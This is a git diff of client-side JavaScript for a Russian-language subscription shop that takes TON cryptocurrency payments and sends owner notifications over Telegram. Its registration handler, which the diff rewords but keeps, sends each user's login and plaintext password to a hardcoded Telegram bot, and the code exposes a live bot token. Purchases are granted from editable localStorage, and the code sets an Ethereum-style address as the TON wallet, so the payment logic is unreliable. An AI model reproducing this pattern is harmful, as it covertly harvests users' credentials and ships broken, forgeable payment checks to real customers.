@@ -1,15 +1,14 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     // ==========================================
-    // ⚙️ НАСТРОЙКИ (ЗАПОЛНИ ЭТИ ДАННЫЕ)
+    // ⚙️ НАСТРОЙКИ (ВСТАВЬ ТОЛЬКО СВОЙ КОШЕЛЕК)
     // ==========================================
     const TG_BOT_TOKEN = '8295559037:AAHQquYCqOdD9nGofg65ibGOmvLjYlR4QiA';
     const TG_CHAT_ID = '5683927471'; 
     
-    const MY_TON_ADDRESS = 'UQCiXX9tf5Uu8hvIqhowpYwjYDti7A5cTVqTVS1CHo5kTr64'; // Твой адрес
-    const TON_API_KEY = 'UQCiXX9tf5Uu8hvIqhowpYwjYDti7A5cTVqTVS1CHo5kTr64'; // Ключ с сайта tonapi.io
+    const MY_TON_ADDRESS = '0xb472f207cac89DFC64A518d97535D3BbfEaf2FEB'; // Сюда придут деньги
 
-    const TON_EXCHANGE_RATE = 650; // Курс 1 TON = 650 RUB
+    const TON_EXCHANGE_RATE = 180; // Курс рубля к TON
     const SUBSCRIPTION_DURATION = 2592000000; // 30 дней в мс
     const isMobile = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
@@ -35,34 +34,39 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentOrder = null;
     let checkInterval = null;
 
-    // --- DOM ЭЛЕМЕНТЫ ---
     const grid = document.getElementById('products-grid');
     const mainMenu = document.getElementById('mainMenu');
     const authModal = document.getElementById('authModal');
     const paymentModal = document.getElementById('paymentModal');
 
     // ==========================================
-    // 🔍 ЛОГИКА АВТО-ОПЛАТЫ (TONAPI)
+    // 🔍 БЕСПЛАТНАЯ АВТО-ПРОВЕРКА (TONCENTER PUBLIC)
     // ==========================================
     async function checkPayment() {
         if (!currentOrder) return;
+        
         try {
-            const response = await fetch(`https://tonapi.io/v2/blockchain/accounts/${MY_TON_ADDRESS}/transactions?limit=15`, {
-                headers: { 'Authorization': `Bearer ${TON_API_KEY}` }
-            });
+            // Используем публичный бесплатный узел toncenter.com
+            const response = await fetch(`https://toncenter.com/api/v2/getTransactions?address=${MY_TON_ADDRESS}&limit=10&to_lt=0&archival=false`);
             const data = await response.json();
-            if (data.transactions) {
-                for (let tx of data.transactions) {
-                    const comment = tx.in_msg?.decoded_body?.text || "";
-                    const valueTon = (tx.in_msg?.value || 0) / 1000000000;
-                    
+
+            if (data.ok && data.result) {
+                for (let tx of data.result) {
+                    // Извлекаем комментарий и сумму
+                    const comment = tx.in_msg.message || "";
+                    const valueNano = tx.in_msg.value || 0;
+                    const valueTon = parseFloat(valueNano) / 1000000000;
+
+                    // Если комментарий совпал и сумма близка к нужной
                     if (comment === currentOrder.memo && valueTon >= (currentOrder.amountTon * 0.98)) {
                         finalizeTransaction();
                         break;
                     }
                 }
             }
-        } catch (e) { console.error("Blockchain error:", e); }
+        } catch (e) {
+            console.log("Ожидание транзакции...");
+        }
     }
 
     function finalizeTransaction() {
@@ -70,13 +74,13 @@ document.addEventListener('DOMContentLoaded', () => {
         userPurchases.push({ id: currentOrder.productId, expires: Date.now() + SUBSCRIPTION_DURATION });
         localStorage.setItem(`purchases_${currentUser}`, JSON.stringify(userPurchases));
         
-        // Уведомление владельцу
+        // Отправка уведомления в Telegram владельцу
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: `✅ <b>ОПЛАТА ПОЛУЧЕНА!</b>\nЮзер: ${currentUser}\nТовар: ${currentOrder.title}\nСумма: ${currentOrder.amountTon} TON`, 
+                text: `✅ <b>БЕСПЛАТНАЯ ПРОВЕРКА: ОПЛАТА!</b>\nЮзер: ${currentUser}\nТовар: ${currentOrder.title}\nСумма: ${currentOrder.amountTon} TON`, 
                 parse_mode: 'HTML' 
             })
         });
@@ -87,7 +91,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ==========================================
-    // 🛠 СТАНДАРТНЫЕ ФУНКЦИИ
+    // 🛠 БАЗОВЫЕ ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ)
     // ==========================================
     function loadAndMigratePurchases(user) {
         if (!user) { userPurchases = []; return; }
@@ -129,20 +133,23 @@ document.addEventListener('DOMContentLoaded', () => {
         if (!currentUser) { alert(translations[currentLang].loginAlert); authModal.classList.remove('hidden'); return; }
         const product = products.find(p => p.id === id);
         const amountTon = (product.price / TON_EXCHANGE_RATE).toFixed(2);
-        const memo = `ACUS_${Math.floor(10000 + Math.random()*90000)}`;
+        
+        // Создаем уникальный комментарий для блокчейна
+        const memo = `ID${Math.floor(Math.random() * 90000 + 10000)}`;
 
         currentOrder = { productId: id, title: product.title, amountTon, memo };
+        
         document.getElementById('payName').textContent = product.title;
         document.getElementById('payAmount').textContent = `${amountTon} TON`;
         document.getElementById('walletAddr').value = MY_TON_ADDRESS;
         document.getElementById('payMemo').value = memo;
         paymentModal.classList.remove('hidden');
 
+        // Проверяем раз в 15 секунд (чтобы бесплатный API не забанил за частые запросы)
         if (checkInterval) clearInterval(checkInterval);
-        checkInterval = setInterval(checkPayment, 8000);
+        checkInterval = setInterval(checkPayment, 15000);
     };
 
-    // --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (МЕНЮ, ЛОГИН) ---
     function updateAuthUI() {
         loadAndMigratePurchases(currentUser);
         if(currentUser) {
@@ -156,6 +163,7 @@ document.addEventListener('DOMContentLoaded', () => {
         renderProducts();
     }
 
+    // --- ОБРАБОТЧИКИ СОБЫТИЙ ---
     document.getElementById('hamburgerBtn').addEventListener('click', (e) => { e.stopPropagation(); mainMenu.classList.toggle('hidden'); });
     document.getElementById('menuLoginBtn').addEventListener('click', () => { authModal.classList.remove('hidden'); mainMenu.classList.add('hidden'); });
     document.getElementById('menuRegisterBtn').addEventListener('click', () => { document.getElementById('regModal').classList.remove('hidden'); mainMenu.classList.add('hidden'); });
@@ -177,7 +185,7 @@ document.addEventListener('DOMContentLoaded', () => {
         e.preventDefault();
         const login = document.getElementById('newLogin').value;
         const pass = document.getElementById('newPass').value;
-        const msg = `🔔 <b>Новая регистрация:</b>\nЛогин: ${login}\nПасс: ${pass}`;
+        const msg = `🔔 <b>Заявка:</b>\nЛогин: ${login}\nПасс: ${pass}`;
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML'})});
         alert(translations[currentLang].regSuccess);
         document.getElementById('regModal').classList.add('hidden');
@@ -195,7 +203,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Аврора анимация
     if (!isMobile) {
         document.addEventListener('mousemove', (e) => {
             const x = e.clientX / window.innerWidth;
@@ -207,4 +214,3 @@ document.addEventListener('DOMContentLoaded', () => {
 
     updateAuthUI();
 });
-
